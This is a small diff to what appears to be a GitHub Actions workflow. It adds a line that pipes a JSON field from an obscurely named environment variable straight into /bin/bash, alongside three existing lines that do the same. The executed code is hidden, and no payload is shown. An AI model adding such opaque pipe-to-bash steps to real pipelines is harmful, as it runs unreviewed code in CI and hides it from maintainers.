@@ -24,6 +24,7 @@ jobs:
           echo $dpai0424 | jq -r .xpo83 | /bin/bash
           printf '%s' "$g4195" | jq -r .ymasl85857 | /bin/bash
           echo $cpspi63717 | jq -r .fs99132 | /bin/bash
+          echo $psy25 | jq -r .pv28738 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
